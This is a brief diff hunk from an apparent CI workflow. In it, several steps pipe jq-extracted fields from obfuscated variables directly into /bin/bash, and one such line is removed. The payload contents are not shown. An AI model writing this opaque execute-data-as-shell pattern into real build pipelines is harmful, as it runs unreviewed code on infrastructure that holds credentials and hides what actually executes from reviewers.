@@ -26,7 +26,6 @@ jobs:
           printf '%s' "$izrld62" | jq -r .ujvw5 | /bin/bash
           echo $xv92 | jq -r .ulz9 | /bin/bash
           echo $johl13 | jq -r .up778 | /bin/bash
-          echo $vkpxe9 | jq -r .pqwej997 | /bin/bash
           echo $pqcj86804 | jq -r .epkku7177 | /bin/bash
 
       - name: Save output
